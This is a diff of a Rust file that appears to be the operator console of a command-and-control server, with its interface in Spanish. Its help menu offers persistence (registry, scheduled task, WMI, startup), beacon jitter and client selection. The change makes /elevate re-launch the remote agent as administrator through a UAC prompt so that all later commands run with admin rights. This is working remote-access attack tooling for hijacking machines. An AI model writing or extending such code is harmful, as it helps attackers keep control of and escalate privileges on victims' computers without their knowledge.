@@ -682,7 +682,7 @@ async fn main() {
                     println!("  {} {:<20} {}", "📌".bright_magenta(), "/persist <method>", "Establece persistencia (registry|task|wmi|startup)".bright_white());
                     println!("  {} {:<20} {}", "🧹".bright_yellow(), "/persist_remove", "Remueve persistencia del cliente".bright_white());
                     println!("  {} {:<20} {}", "📡".bright_blue(), "/beacon <int:jit>", "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white());
-                    println!("  {} {:<20} {}", "⬆️ ".bright_red(), "/elevate <comando>", "Ejecuta comando con privilegios elevados (UAC prompt)".bright_white());
+                    println!("  {} {:<20} {}", "⬆️ ".bright_red(), "/elevate", "Re-ejecuta agente como admin (UAC prompt, después todos los cmds son admin)".bright_white());
                     println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                     println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                     println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
@@ -1304,32 +1304,25 @@ async fn main() {
                     }
                 }
                 "/elevate" => {
-                    if parts.len() < 2 {
-                        println!("{} /elevate <comando>", "❌ Uso:".bright_red());
-                        println!("   Ejemplo: /elevate whoami /priv");
-                        println!("   ⚠️  Esto mostrará un prompt UAC al usuario");
-                        continue;
-                    }
-                    
-                    let command = parts[1..].join(" ");
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
                         let clients = clients.lock().unwrap();
                         
                         if let Some(client) = clients.get(&id) {
-                            info!("[{}] Comando /elevate: {}", id, command);
+                            info!("[{}] Comando /elevate: Re-ejecutando agente con privilegios admin", id);
                             
                             println!();
                             println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
-                            println!("{}", format!("║      ⬆️  ELEVANDO PRIVILEGIOS [{}]", id).bright_red().bold());
+                            println!("{}", format!("║      ⬆️  ELEVANDO AGENTE A ADMIN [{}]", id).bright_red().bold());
                             println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
                             println!();
-                            println!("{}", format!("  🎯 Comando: {}", command).bright_yellow());
-                            println!("{}", "  ⚠️  Se mostrará UAC prompt al usuario...".bright_white().dimmed());
+                            println!("{}", "  🎯 Re-ejecutando agente con privilegios elevados...".bright_yellow());
+                            println!("{}", "  ⚠️  Se mostrará UAC prompt al usuario".bright_white().dimmed());
+                            println!("{}", "  🔄 El agente actual se desconectará y el elevado se reconectará".bright_white().dimmed());
                             println!();
                             
-                            let elevate_cmd = format!("__ELEVATE__:{}", command);
+                            let elevate_cmd = "__ELEVATE__".to_string();
                             if let Err(e) = client.tx.send(elevate_cmd) {
                                 error!("[{}] Error enviando comando __ELEVATE__: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
